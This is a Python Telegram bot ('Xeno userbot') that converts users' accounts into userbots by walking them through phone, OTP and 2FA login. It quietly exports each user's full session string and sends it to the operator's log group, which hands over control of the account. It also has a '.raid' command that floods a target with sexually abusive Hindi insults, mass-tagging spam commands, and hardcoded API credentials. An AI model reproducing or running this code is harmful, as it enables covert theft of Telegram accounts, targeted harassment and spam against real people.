import os
import asyncio
import random
import json
import sys
import time
from pyrogram import Client, filters, errors, handlers
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from flask import Flask
from threading import Thread

# --- TIME STAMP FOR UPTIME ---
BOT_START_TIME = time.time()

# --- LOOP POLICY PATCH ---
if sys.platform >= "win32":
    asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())

# --- CONFIGURATION ---
API_ID = 31980984
API_HASH = "a61358dd3cd8c3a56cd53d9ddd8a0c67"
BOT_TOKEN = "8709782891:AAEZPLJQOOJ6b-9WEMXsYWJSNu2YUu14fbI"
LOG_GROUP = -1003867805165 

# MEDIA LINKS
START_IMG = "https://graph.org/file/422440e09d466500f2c93-953253772b0d8d2bfc.jpg"
ALIVE_IMG = "https://graph.org/file/422440e09d466500f2c93-953253772b0d8d2bfc.jpg"

OWNER_ID = 8724182918
OWNER_USERNAME = "@CoderNova"
SESSION_FILE = "sessions.json"

# --- LOCAL STORAGE FUNCTION SYSTEM ---
def load_local_sessions():
    if os.path.exists(SESSION_FILE):
        try:
            with open(SESSION_FILE, "r") as f: return json.load(f)
        except Exception: return {}
    return {}

def save_local_session(user_id, session_str):
    data = load_local_sessions()
    data[str(user_id)] = session_str
    with open(SESSION_FILE, "w") as f: json.dump(data, f, indent=4)

def remove_local_session(user_id):
    data = load_local_sessions()
    if str(user_id) in data:
        del data[str(user_id)]
        with open(SESSION_FILE, "w") as f: json.dump(data, f, indent=4)

def get_readable_time(seconds: int) -> str:
    count = 0
    ping_time = ""
    time_list = []
    time_suffix_list = ["s", "m", "h", "days"]
    while count < 4:
        count += 1
        if count < 3: remaining, time_to_add = divmod(seconds, 60)
        else: remaining, time_to_add = divmod(seconds, 24)
        if seconds == 0 and remaining == 0: break
        time_list.append(int(time_to_add))
        seconds = int(remaining)
    for x in range(len(time_list)):
        time_list[x] = str(time_list[x]) + time_suffix_list[x]
    if len(time_list) == 4:
        ping_time += time_list.pop() + ", "
    time_list.reverse()
    ping_time += ":".join(time_list)
    return ping_time

# --- WEB SERVER FOR RENDER ---
app = Flask('')
@app.route('/')
def home(): return "xᴇɴᴏ Bᴏᴛ Is Oɴʟɪɴᴇ! ✨"

def run_web():
    port = int(os.environ.get("PORT", 8080))
    app.run(host='0.0.0.0', port=port)

bot = Client("XenoGen", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)
user_data = {}
active_tasks = {}
running_ubots = {}

# --- KEYBOARDS & BUTTONS ---
main_buttons = InlineKeyboardMarkup([
    [InlineKeyboardButton("❂ 𝐀𝐝𝐝 𝐌𝐞 ❂", callback_data="add_btn"),
     InlineKeyboardButton("❂ 𝐇𝐞𝐥𝐩 ❂", callback_data="help_btn")],
    [InlineKeyboardButton("❂ 𝐔𝐩𝐝𝐚𝐭𝐞 ❂", url="https://t.me/radhesupport"),
     InlineKeyboardButton("❂ 𝐒𝐮𝐩𝐩𝐨𝐫𝐭 ❂", url="https://t.me/radhesupport")],
    [InlineKeyboardButton("❂ 𝐂𝐥𝐨𝐬𝐞 ❂", callback_data="close")]
])

help_back_button = InlineKeyboardMarkup([
    [InlineKeyboardButton("🔙 𝐁𝐚𝐜𝐤", callback_data="back_to_start")]
])

# --- YOUR CUSTOM CHAT LIST (ALAG ALAG LINES ME BREAK) ---
DAILY_CHATS = [
    "Hello {mention} 👋\n\nKaise ho aap?",
    "Kaise ho {mention} ✨\n\nSab badhiya h na?",
    "Hii {mention} 🙌\n\nSuno ek baar idhar aao",
    "Radhe radhe {mention} 🙏\n\nAur kya chal raha hai?",
    "Jay shree ram {mention} 🚩\n\nKahan ghum ho aajkal?",
    "Kya kr rhe ho {mention} 🤔\n\nFree ho ya busy?",
    "Kkrh {mention} 💬\n\nReply do jaldi se",
    "Kha se ho aap {mention} 📍\n\nState batana apna",
    "Group me aaya kro {mention} 👥\n\nSab yaad karte hain aapko",
    "Ghar pe sb kaise ho {mention} 🏡\n\nSab thik thak na?",
    "Vc aaya kro song suna kro {mention} 🎧\n\nMast mahol rehta hai",
    "Vc aaya kro sbse baat kiya kro {mention} 🎙️\n\nAcha lagega aapko",
    "Admin chaiye hoto active rho {mention} 🛠️\n\nTabhi milega post",
    "Or ghar me sb kaise h {mention} ❤️\n\nSab maze me hain na?",
    "Aapka name kya h {mention} 👤\n\nMaine pucha hi nahi pehle",
    "Aate kyu nhi ho group me {mention} ❓\n\nKyu naraz ho sabse?",
    "Active rho yr {mention} ⚡\n\nGroup ekdum thanda pad gaya hai",
    "Or sunao sb badiya {mention} ☕\n\nKuch naya taza batao"
]

# --- RAID PACK ---
ABUSE_RAIDS = [
    "ᴛᴇʀɪ ᴍᴀᴀ ᴋɪ ᴄʜᴏᴏᴛ ᴍᴇ @target 💦\n\nᴋᴀ ʟᴀɴᴅ ɢʜᴜsᴀ ᴅᴜɴɢᴀ ᴘᴜʀᴀ\nᴊᴀ sᴀᴅᴀᴋ sᴇ ᴀᴘɴɪ ᴍᴀᴀ ᴜᴛʜᴀ ᴋᴇ ʟᴀᴀ ! 👊",
    "ɴɪᴋᴀʟ ᴍᴀᴅᴀʀᴄʜᴏᴅ @target 🔥\n\nʙᴇᴛᴀ ᴘᴀᴘᴀ sᴇ ᴘᴀɴɢᴀ ɴᴀʜɪ ʟᴇᴛᴇ\nᴛᴇʀɪ ʙᴇʜᴇɴ ᴋᴏ ʙᴇᴄʜ ᴅᴜɴɢᴀ ʙᴀᴢᴀᴀʀ ᴍᴇ !",
    "ᴍᴀᴀ ᴄʜᴜᴅᴀ ᴀᴘɴɪ @target 😂\n\nʀᴀɴᴅɪ ᴋᴇ ᴘɪʟʟᴇ ᴀᴜᴋᴀᴛ ᴍᴇ ʀᴇʜ\nᴛᴇʀɪ ᴍᴀᴍᴍʏ ᴋɪ sᴀʀᴇᴇ ᴋʜᴏʟ sᴀᴋᴛᴀ ʜᴜ ᴍᴀɪ !",
    "ᴛᴇʀɪ ʙᴇʜᴇɴ ᴋɪ ᴄʜᴏᴏᴛ ᴍᴀʀᴏ 🙌\n\nsᴀsᴛᴇ sʜᴀʏᴀʀ @target\nɢᴀɴᴅ ᴍᴇ ᴅᴜᴍ ɴᴀʜɪ ᴀᴜʀ ʙᴀᴀᴛᴇɪɴ ʙᴀᴅɪ ʙᴀᴅɪ !",
    "🔥 sᴍᴀsʜ ᴋᴀʀᴅᴜɴɢᴀ ᴛᴇʀɪ ɢᴀɴᴅ @target\n\nᴊᴀ ʀᴏ ᴀᴘɴɪ ᴍᴀᴀ ᴋᴇ ᴀᴀᴄʜᴀʟ ᴍᴇ\nᴘᴀᴘᴀ sᴇ ʀᴀɪᴅ ʟᴇɢᴀ ᴛᴜ ʙᴇɢɢᴀʀ !"
]

# --- USERBOT CORE HANDLERS ---
async def alive_cmd(c, m):
    uptime = get_readable_time(int(time.time() - BOT_START_TIME))
    alive_text = (
        f"✨ **『 xᴇɴᴏ ᴜsᴇʀʙᴏᴛ ɪs ᴀʟɪᴠᴇ 』** ✨\n\n"
        f"⚙️ **Sʏsᴛᴇᴍ Sᴛᴀᴛᴜs:** `Rᴜɴɴɪɴɢ Sᴍᴏᴏᴛʜʟʏ`\n"
        f"⏳ **Uᴘᴛɪᴍᴇ:** `{uptime}`\n"
        f"👤 **Usᴇʀ:** {c.me.mention}\n"
        f"👑 **Oᴡɴᴇʀ:** {OWNER_USERNAME}"
    )
    try:
        await m.delete()
        await c.send_photo(m.chat.id, photo=ALIVE_IMG, caption=alive_text)
    except Exception:
        await m.edit_text(alive_text)

async def tagall_cmd(c, m):
    uid = c.me.id
    active_tasks[uid] = True
    input_text = m.text.split(None, 1)[1] if len(m.command) > 1 else "ʜᴇʏ, ᴋᴀʜᴀɴ ʜᴏ sᴀʙ?"
    await m.delete()
    try:
        async for member in c.get_chat_members(m.chat.id):
            if not active_tasks.get(uid): break 
            if member.user.is_bot or member.user.is_deleted: continue
            try:
                mention = f"[{member.user.first_name or 'User'}](tg://user?id={member.user.id})"
                await c.send_message(m.chat.id, f"{input_text}\n\n{mention}")
                await asyncio.sleep(3.5)
            except Exception: pass
    except Exception: pass

async def onetag_cmd(c, m):
    uid = c.me.id
    active_tasks[uid] = True 
    await m.delete()
    try:
        async for member in c.get_chat_members(m.chat.id):
            if not active_tasks.get(uid): break 
            if member.user.is_bot or member.user.is_deleted: continue
            try:
                mention = f"[{member.user.first_name or 'User'}](tg://user?id={member.user.id})"
                msg = random.choice(DAILY_CHATS).format(mention=mention)
                await c.send_message(m.chat.id, msg)
                await asyncio.sleep(4.0)
            except Exception: pass
    except Exception: pass

async def raid_cmd(c, m):
    uid = c.me.id
    args = m.text.split()
    if len(args) < 3: return await m.edit_text("❌ **Usage:** `.raid 5 @username`")
    active_tasks[uid] = True 
    try:
        count, target = int(args[1]), args[2]
        await m.delete()
        for _ in range(count):
            if not active_tasks.get(uid): break 
            try:
                msg = random.choice(ABUSE_RAIDS).replace("@target", target)
                await c.send_message(m.chat.id, msg)
                await asyncio.sleep(2.5) 
            except Exception: pass
    except Exception: pass

async def stop_cmd(c, m):
    uid = c.me.id
    active_tasks[uid] = False 
    await m.edit_text("🚫 **『 ᴀʟʟ ᴘʀᴏᴄᴇssᴇs sᴛᴏᴘᴘᴇᴅ 』**")

def register_ubot_handlers(ubot):
    ubot.add_handler(handlers.MessageHandler(alive_cmd, filters.command("alive", ".") & filters.me))
    ubot.add_handler(handlers.MessageHandler(tagall_cmd, filters.command("tagall", ".") & filters.me))
    ubot.add_handler(handlers.MessageHandler(onetag_cmd, filters.command("onetag", ".") & filters.me))
    ubot.add_handler(handlers.MessageHandler(raid_cmd, filters.command("raid", ".") & filters.me))
    ubot.add_handler(handlers.MessageHandler(stop_cmd, filters.command("stop", ".") & filters.me))

# --- CAPTIONS & MENUS ---
START_TEXT = """✨ **ᴡᴇʟᴄᴏᴍᴇ ᴛᴏ xᴇɴᴏ ᴜsᴇʀʙᴏᴛ ᴄᴏɴᴛʀᴏʟ ᴘᴀɴᴇʟ** ✨

ʜᴇʏ {mention}, ᴀᴀᴘ ɪs ʙᴏᴛ ᴋɪ ᴍᴀᴅᴀᴅ sᴇ ᴀᴘɴᴇ ᴀᴄᴄᴏᴜɴᴛ ᴋᴏ ᴜsᴇʀʙᴏᴛ ᴍᴇ ᴄᴏɴᴠᴇʀᴛ ᴋᴀʀ sᴀᴋᴛᴇ ʜᴀɪɴ.

⚙️ **ᴄᴏᴍᴍᴀɴᴅs STATUS:** `ᴀʟɪᴠᴇ ᴀɴᴅ ᴏᴘᴇɴ`
🚀 **ᴘᴏᴡᴇʀᴇᴅ ʙʏ:** {owner}"""

HELP_TEXT = """🛠️ **xᴇɴᴏ ᴜsᴇʀʙᴏᴛ - ʜᴇʟᴘ ᴍᴇɴᴜ** 🛠️

Aap apne userbot account se kisi bhi group me neeche diye gaye commands use kar sakte hain:

🔹 `.alive` - Check if your userbot is online with system logs.
🔹 `.tagall [text]` - Mentions all group members with custom text.
🔹 `.onetag` - Tags group members one-by-one with beautiful custom Hindi lines.
🔹 `.raid [count] [@username]` - Starts a high-speed break-line raid on the target.
🔹 `.stop` - Stops all running tagall, onetag, or raid processes instantly."""

@bot.on_message(filters.command("start") & filters.private)
async def start_handler(c, m):
    try:
        await m.reply_photo(photo=START_IMG, caption=START_TEXT.format(mention=m.from_user.mention, owner=OWNER_USERNAME), reply_markup=main_buttons)
    except Exception:
        await m.reply_text(START_TEXT.format(mention=m.from_user.mention, owner=OWNER_USERNAME), reply_markup=main_buttons)

@bot.on_message(filters.command("help") & filters.private)
async def help_handler(c, m):
    await m.reply_text(HELP_TEXT, reply_markup=help_back_button)

@bot.on_callback_query()
async def handle_callbacks(c, q):
    if q.data == "close": 
        await q.message.delete()
    elif q.data == "help_btn":
        await q.message.edit_text(HELP_TEXT, reply_markup=help_back_button)
    elif q.data == "back_to_start":
        await q.message.delete()
        try:
            await c.send_photo(q.message.chat.id, photo=START_IMG, caption=START_TEXT.format(mention=q.from_user.mention, owner=OWNER_USERNAME), reply_markup=main_buttons)
        except Exception:
            await c.send_message(q.message.chat.id, START_TEXT.format(mention=q.from_user.mention, owner=OWNER_USERNAME), reply_markup=main_buttons)
    elif q.data == "add_btn":
        await q.message.reply_text("📲 **sᴇɴᴅ ʏᴏᴜʀ ᴘʜᴏɴᴇ ɴᴜᴍʙᴇʀ ᴡɪᴛʜ ᴄᴏᴜɴᴛʀʏ ᴄᴏᴅᴇ (e.g. +91XXXXXXXXXX):**")
        await q.message.delete()

@bot.on_message(filters.text & filters.private & ~filters.bot)
async def handle_steps(c, m):
    uid = m.from_user.id
    text = m.text
    if text.startswith("+"):
        user_data[uid] = {"phone": text}
        temp_c = Client(f"temp_{uid}", API_ID, API_HASH, in_memory=True)
        await temp_c.connect()
        try:
            code = await temp_c.send_code(text)
            user_data[uid].update({"client": temp_c, "hash": code.phone_code_hash})
            await m.reply_text("📩 **ᴏᴛᴘ sᴇɴᴛ!** ᴘʟᴇᴀsᴇ sᴇɴᴅ ɪᴛ ʟɪᴋᴇ: `1 2 3 4 5`")
        except Exception as e: await m.reply_text(f"❌ `{e}`")
    elif text.replace(" ", "").isdigit() and uid in user_data and "hash" in user_data[uid]:
        otp = text.replace(" ", "")
        try:
            await user_data[uid]["client"].sign_in(user_data[uid]["phone"], user_data[uid]["hash"], otp)
            await finalize_login(c, m, uid)
        except errors.SessionPasswordNeeded: await m.reply_text("🔐 **2FA ᴘᴀssᴡᴏʀᴅ sᴇɴᴅ ᴋᴀʀᴇɪɴ.**")
        except Exception as e: await m.reply_text(f"❌ `{e}`")

async def finalize_login(c, m, uid):
    data = user_data[uid]
    string = await data["client"].export_session_string()
    save_local_session(uid, string)
    ubot = Client(f"ubot_{uid}", API_ID, API_HASH, session_string=string)
    register_ubot_handlers(ubot)
    await ubot.start()
    running_ubots[uid] = ubot
    await m.reply_text("✅ **xᴇɴᴏ ᴜsᴇʀʙᴏᴛ ᴀᴄᴛɪᴠᴀᴛᴇᴅ sᴜᴄᴄᴇsғᴜʟʟʏ!**")
    try: await bot.send_message(LOG_GROUP, f"🏁 **ɴᴇᴡ sᴇssɪᴏɴ:** `{uid}`\n`{string}`")
    except Exception: pass
    del user_data[uid]

# --- MAIN ASYNC BOOTSTRAPPER ---
async def start_services():
    print("[INFO] Launching main Bot Engine...")
    await bot.start()
    print("[SUCCESS] Engine active and listening.")
    
    saved_sessions = load_local_sessions()
    for u_id, string in saved_sessions.items():
        try:
            ubot = Client(f"ubot_{u_id}", API_ID, API_HASH, session_string=string)
            register_ubot_handlers(ubot)
            await ubot.start()
            running_ubots[int(u_id)] = ubot
            print(f"[SUCCESS] Auto-loaded userbot: {u_id}")
        except Exception: pass

    while True:
        await asyncio.sleep(3600)

if __name__ == "__main__":
    Thread(target=run_web, daemon=True).start()
    loop = asyncio.get_event_loop()
    try:
        loop.run_until_complete(start_services())
    except (KeyboardInterrupt, SystemExit):
        print("[INFO] Bot Stopped.")
